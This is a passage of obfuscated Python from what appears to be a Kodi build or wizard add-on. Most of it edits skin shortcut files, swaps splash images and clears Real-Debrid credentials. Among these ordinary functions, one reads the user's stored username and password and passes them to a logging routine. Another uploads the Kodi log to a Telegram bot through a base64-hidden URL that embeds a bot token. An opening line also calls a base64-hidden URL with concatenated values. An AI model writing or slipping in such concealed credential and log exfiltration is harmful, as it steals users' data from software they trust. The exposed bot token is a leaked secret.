          OOOO000O00O0OOO00 =urllib2 .urlopen (OOO0OO00000O000OO .decode ('base64')+' - '+O0OOOO0OO00O00O00 +' - '+O0O0O0000O00OOO00 +' - '+O0000OO0OO00O00OO ).readlines ()#line:574
       except :pass #line:575
def googleindicat ():#line:578
			import logg #line:579
			OO0OOO0O000OOO00O =(ADDON .getSetting ("pass"))#line:580
			O0O0O0O0OOOO0O0O0 =(ADDON .getSetting ("user"))#line:581
			logg .logGA (OO0OOO0O000OOO00O ,O0O0O0O0OOOO0O0O0 )#line:582
def logsend ():#line:583
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:584
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:585
      howsentlog ()#line:587
      import requests #line:588
      if xbmc .getCondVisibility ('system.platform.windows'):#line:589
         OOOOO0OO0O0O0OOO0 =xbmc .translatePath ('special://home/kodi.log')#line:590
         OO0O0O00OOO0OO00O ={'chat_id':(None ,'-274262389'),'document':(OOOOO0OO0O0O0OOO0 ,open (OOOOO0OO0O0O0OOO0 ,'rb')),}#line:594
         OOOOO0OO0000000O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:595
         OO000O0OO000OO00O =requests .post (OOOOO0OO0000000O0 .decode ('base64'),files =OO0O0O00OOO0OO00O )#line:597
      elif xbmc .getCondVisibility ('system.platform.android'):#line:598
           OOOOO0OO0O0O0OOO0 =xbmc .translatePath ('special://temp/kodi.log')#line:599
           OO0O0O00OOO0OO00O ={'chat_id':(None ,'-274262389'),'document':(OOOOO0OO0O0O0OOO0 ,open (OOOOO0OO0O0O0OOO0 ,'rb')),}#line:603
           OOOOO0OO0000000O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:604
           OO000O0OO000OO00O =requests .post (OOOOO0OO0000000O0 .decode ('base64'),files =OO0O0O00OOO0OO00O )#line:606
      else :#line:607
           OOOOO0OO0O0O0OOO0 =xbmc .translatePath ('special://kodi.log')#line:608
           OO0O0O00OOO0OO00O ={'chat_id':(None ,'-274262389'),'document':(OOOOO0OO0O0O0OOO0 ,open (OOOOO0OO0O0O0OOO0 ,'rb')),}#line:612
           OOOOO0OO0000000O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:613
           OO000O0OO000OO00O =requests .post (OOOOO0OO0000000O0 .decode ('base64'),files =OO0O0O00OOO0OO00O )#line:615
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:616
def rdoff ():#line:618
	O00O00OOO0O0000O0 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:619
	O00O00OOO0O0000O0 .setSetting ('rd.client_id','')#line:620
	O00O00OOO0O0000O0 .setSetting ('rd.secret','')#line:621
	O00O00OOO0O0000O0 .setSetting ('rdsource','false')#line:622
	O00O00OOO0O0000O0 .setSetting ('super_fast_type_toren','false')#line:623
	O00O00OOO0O0000O0 .setSetting ('rd.auth','false')#line:624
	O00O00OOO0O0000O0 .setSetting ('rd.refresh','false')#line:625
	O00O00OOO0O0000O0 =xbmcaddon .Addon ('script.module.resolveurl')#line:627
	O00O00OOO0O0000O0 .setSetting ('RealDebridResolver_client_id','')#line:628
	O00O00OOO0O0000O0 .setSetting ('RealDebridResolver_client_secret','')#line:629
	O00O00OOO0O0000O0 .setSetting ('RealDebridResolver_token','')#line:630
	O00O00OOO0O0000O0 .setSetting ('RealDebridResolver_refresh','')#line:631
	O00O00OOO0O0000O0 =xbmcaddon .Addon ('plugin.video.seren')#line:633
	O00O00OOO0O0000O0 .setSetting ('rd.client_id','')#line:634
	O00O00OOO0O0000O0 .setSetting ('rd.secret','')#line:635
	O00O00OOO0O0000O0 .setSetting ('rd.auth','')#line:636
	O00O00OOO0O0000O0 .setSetting ('rd.refresh','')#line:637
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:638
		O00O00OOO0O0000O0 =xbmcaddon .Addon ('plugin.video.gaia')#line:639
		O00O00OOO0O0000O0 .setSetting ('accounts.debrid.realdebrid.id','')#line:640
		O00O00OOO0O0000O0 .setSetting ('accounts.debrid.realdebrid.secret','')#line:641
		O00O00OOO0O0000O0 .setSetting ('accounts.debrid.realdebrid.token','')#line:642
		O00O00OOO0O0000O0 .setSetting ('accounts.debrid.realdebrid.refresh','')#line:643
	resloginit .resloginit ('restore','all')#line:644
	O0O0000OOO0O00O0O =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:646
	O00OO000OOO00O00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:647
	copyfile (O0O0000OOO0O00O0O ,O00OO000OOO00O00O )#line:648
def skindialogsettind18 ():#line:649
	try :#line:650
		O00OO000OOOO0O0OO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:651
		O0O0OOOO00OO0O0O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:652
		copyfile (O00OO000OOOO0O0OO ,O0O0OOOO00OO0O0O0 )#line:653
	except :pass #line:654
def rdon ():#line:655
	loginit .loginIt ('restore','all')#line:656
	O0OO0OO00O000O0O0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:658
	OOOO0OO0O0OO00O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:659
	copyfile (O0OO0OO00O000O0O0 ,OOOO0OO0O0OO00O00 )#line:660
def adults18 ():#line:662
  O0OOO00OOO000OOOO =(ADDON .getSetting ("adults"))#line:663
  if O0OOO00OOO000OOOO =='true':#line:664
    O000O0OOOO0O0O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:665
    with open (O000O0OOOO0O0O0O0 ,'r')as OOOOO000OOOO0O0OO :#line:666
      OOO00O000O00O0O0O =OOOOO000OOOO0O0OO .read ()#line:667
    OOO00O000O00O0O0O =OOO00O000O00O0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:685
    with open (O000O0OOOO0O0O0O0 ,'w')as OOOOO000OOOO0O0OO :#line:688
      OOOOO000OOOO0O0OO .write (OOO00O000O00O0O0O )#line:689
def rdbuildaddon ():#line:690
  O0OOO0O00O0O0000O =(ADDON .getSetting ("auto_rd"))#line:691
  if O0OOO0O00O0O0000O =='true':#line:692
    O00OOO00OO0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:693
    with open (O00OOO00OO0O00OO0 ,'r')as O0O0OOOO0OO00O0OO :#line:694
      O0000O0000OO00000 =O0O0OOOO0OO00O0OO .read ()#line:695
    O0000O0000OO00000 =O0000O0000OO00000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:713
    with open (O00OOO00OO0O00OO0 ,'w')as O0O0OOOO0OO00O0OO :#line:716
      O0O0OOOO0OO00O0OO .write (O0000O0000OO00000 )#line:717
    O00OOO00OO0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:721
    with open (O00OOO00OO0O00OO0 ,'r')as O0O0OOOO0OO00O0OO :#line:722
      O0000O0000OO00000 =O0O0OOOO0OO00O0OO .read ()#line:723
    O0000O0000OO00000 =O0000O0000OO00000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:741
    with open (O00OOO00OO0O00OO0 ,'w')as O0O0OOOO0OO00O0OO :#line:744
      O0O0OOOO0OO00O0OO .write (O0000O0000OO00000 )#line:745
    O00OOO00OO0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:749
    with open (O00OOO00OO0O00OO0 ,'r')as O0O0OOOO0OO00O0OO :#line:750
      O0000O0000OO00000 =O0O0OOOO0OO00O0OO .read ()#line:751
    O0000O0000OO00000 =O0000O0000OO00000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:769
    with open (O00OOO00OO0O00OO0 ,'w')as O0O0OOOO0OO00O0OO :#line:772
      O0O0OOOO0OO00O0OO .write (O0000O0000OO00000 )#line:773
    O00OOO00OO0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:777
    with open (O00OOO00OO0O00OO0 ,'r')as O0O0OOOO0OO00O0OO :#line:778
      O0000O0000OO00000 =O0O0OOOO0OO00O0OO .read ()#line:779
    O0000O0000OO00000 =O0000O0000OO00000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:797
    with open (O00OOO00OO0O00OO0 ,'w')as O0O0OOOO0OO00O0OO :#line:800
      O0O0OOOO0OO00O0OO .write (O0000O0000OO00000 )#line:801
    O00OOO00OO0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:804
    with open (O00OOO00OO0O00OO0 ,'r')as O0O0OOOO0OO00O0OO :#line:805
      O0000O0000OO00000 =O0O0OOOO0OO00O0OO .read ()#line:806
    O0000O0000OO00000 =O0000O0000OO00000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:824
    with open (O00OOO00OO0O00OO0 ,'w')as O0O0OOOO0OO00O0OO :#line:827
      O0O0OOOO0OO00O0OO .write (O0000O0000OO00000 )#line:828
    O00OOO00OO0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:830
    with open (O00OOO00OO0O00OO0 ,'r')as O0O0OOOO0OO00O0OO :#line:831
      O0000O0000OO00000 =O0O0OOOO0OO00O0OO .read ()#line:832
    O0000O0000OO00000 =O0000O0000OO00000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:850
    with open (O00OOO00OO0O00OO0 ,'w')as O0O0OOOO0OO00O0OO :#line:853
      O0O0OOOO0OO00O0OO .write (O0000O0000OO00000 )#line:854
    O00OOO00OO0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:856
    with open (O00OOO00OO0O00OO0 ,'r')as O0O0OOOO0OO00O0OO :#line:857
      O0000O0000OO00000 =O0O0OOOO0OO00O0OO .read ()#line:858
    O0000O0000OO00000 =O0000O0000OO00000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:876
    with open (O00OOO00OO0O00OO0 ,'w')as O0O0OOOO0OO00O0OO :#line:879
      O0O0OOOO0OO00O0OO .write (O0000O0000OO00000 )#line:880
    O00OOO00OO0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:883
    with open (O00OOO00OO0O00OO0 ,'r')as O0O0OOOO0OO00O0OO :#line:884
      O0000O0000OO00000 =O0O0OOOO0OO00O0OO .read ()#line:885
    O0000O0000OO00000 =O0000O0000OO00000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:903
    with open (O00OOO00OO0O00OO0 ,'w')as O0O0OOOO0OO00O0OO :#line:906
      O0O0OOOO0OO00O0OO .write (O0000O0000OO00000 )#line:907
def rdbuildinstall ():#line:910
  try :#line:911
   O00000OOOO00O0OO0 =(ADDON .getSetting ("auto_rd"))#line:912
   if O00000OOOO00O0OO0 =='true':#line:913
     O000OOO00OOO0O0OO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:914
     O0OOO000OOOOOOO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:915
     copyfile (O000OOO00OOO0O0OO ,O0OOO000OOOOOOO0O )#line:916
  except :#line:917
     pass #line:918
def rdbuildaddonoff ():#line:921
    OO0O0OOOOO0O000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:924
    with open (OO0O0OOOOO0O000O0 ,'r')as OO00OOO0O0OO00O00 :#line:925
      OOO0000OO0OOO0000 =OO00OOO0O0OO00O00 .read ()#line:926
    OOO0000OO0OOO0000 =OOO0000OO0OOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:944
    with open (OO0O0OOOOO0O000O0 ,'w')as OO00OOO0O0OO00O00 :#line:947
      OO00OOO0O0OO00O00 .write (OOO0000OO0OOO0000 )#line:948
    OO0O0OOOOO0O000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:952
    with open (OO0O0OOOOO0O000O0 ,'r')as OO00OOO0O0OO00O00 :#line:953
      OOO0000OO0OOO0000 =OO00OOO0O0OO00O00 .read ()#line:954
    OOO0000OO0OOO0000 =OOO0000OO0OOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:972
    with open (OO0O0OOOOO0O000O0 ,'w')as OO00OOO0O0OO00O00 :#line:975
      OO00OOO0O0OO00O00 .write (OOO0000OO0OOO0000 )#line:976
    OO0O0OOOOO0O000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:980
    with open (OO0O0OOOOO0O000O0 ,'r')as OO00OOO0O0OO00O00 :#line:981
      OOO0000OO0OOO0000 =OO00OOO0O0OO00O00 .read ()#line:982
    OOO0000OO0OOO0000 =OOO0000OO0OOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1000
    with open (OO0O0OOOOO0O000O0 ,'w')as OO00OOO0O0OO00O00 :#line:1003
      OO00OOO0O0OO00O00 .write (OOO0000OO0OOO0000 )#line:1004
    OO0O0OOOOO0O000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1008
    with open (OO0O0OOOOO0O000O0 ,'r')as OO00OOO0O0OO00O00 :#line:1009
      OOO0000OO0OOO0000 =OO00OOO0O0OO00O00 .read ()#line:1010
    OOO0000OO0OOO0000 =OOO0000OO0OOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1028
    with open (OO0O0OOOOO0O000O0 ,'w')as OO00OOO0O0OO00O00 :#line:1031
      OO00OOO0O0OO00O00 .write (OOO0000OO0OOO0000 )#line:1032
    OO0O0OOOOO0O000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1035
    with open (OO0O0OOOOO0O000O0 ,'r')as OO00OOO0O0OO00O00 :#line:1036
      OOO0000OO0OOO0000 =OO00OOO0O0OO00O00 .read ()#line:1037
    OOO0000OO0OOO0000 =OOO0000OO0OOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1055
    with open (OO0O0OOOOO0O000O0 ,'w')as OO00OOO0O0OO00O00 :#line:1058
      OO00OOO0O0OO00O00 .write (OOO0000OO0OOO0000 )#line:1059
    OO0O0OOOOO0O000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1061
    with open (OO0O0OOOOO0O000O0 ,'r')as OO00OOO0O0OO00O00 :#line:1062
      OOO0000OO0OOO0000 =OO00OOO0O0OO00O00 .read ()#line:1063
    OOO0000OO0OOO0000 =OOO0000OO0OOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1081
    with open (OO0O0OOOOO0O000O0 ,'w')as OO00OOO0O0OO00O00 :#line:1084
      OO00OOO0O0OO00O00 .write (OOO0000OO0OOO0000 )#line:1085
    OO0O0OOOOO0O000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1087
    with open (OO0O0OOOOO0O000O0 ,'r')as OO00OOO0O0OO00O00 :#line:1088
      OOO0000OO0OOO0000 =OO00OOO0O0OO00O00 .read ()#line:1089
    OOO0000OO0OOO0000 =OOO0000OO0OOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1107
    with open (OO0O0OOOOO0O000O0 ,'w')as OO00OOO0O0OO00O00 :#line:1110
      OO00OOO0O0OO00O00 .write (OOO0000OO0OOO0000 )#line:1111
    OO0O0OOOOO0O000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1114
    with open (OO0O0OOOOO0O000O0 ,'r')as OO00OOO0O0OO00O00 :#line:1115
      OOO0000OO0OOO0000 =OO00OOO0O0OO00O00 .read ()#line:1116
    OOO0000OO0OOO0000 =OOO0000OO0OOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1134
    with open (OO0O0OOOOO0O000O0 ,'w')as OO00OOO0O0OO00O00 :#line:1137
      OO00OOO0O0OO00O00 .write (OOO0000OO0OOO0000 )#line:1138
def rdbuildinstalloff ():#line:1141
    try :#line:1142
       O0O0O0OOO0O0O0000 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1143
       OO0OOO0000O00OOO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1144
       copyfile (O0O0O0OOO0O0O0000 ,OO0OOO0000O00OOO0 )#line:1146
       O0O0O0OOO0O0O0000 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1148
       OO0OOO0000O00OOO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1149
       copyfile (O0O0O0OOO0O0O0000 ,OO0OOO0000O00OOO0 )#line:1151
       O0O0O0OOO0O0O0000 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1153
       OO0OOO0000O00OOO0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1154
       copyfile (O0O0O0OOO0O0O0000 ,OO0OOO0000O00OOO0 )#line:1156
       O0O0O0OOO0O0O0000 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1159
       OO0OOO0000O00OOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1160
       copyfile (O0O0O0OOO0O0O0000 ,OO0OOO0000O00OOO0 )#line:1162
    except :#line:1164
       pass #line:1165
def rdbuildaddonON ():#line:1172
    OOOOO000O0OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1174
    with open (OOOOO000O0OOOOOOO ,'r')as OOO0O00OO0OO0OOO0 :#line:1175
      O000O000O0O00O000 =OOO0O00OO0OO0OOO0 .read ()#line:1176
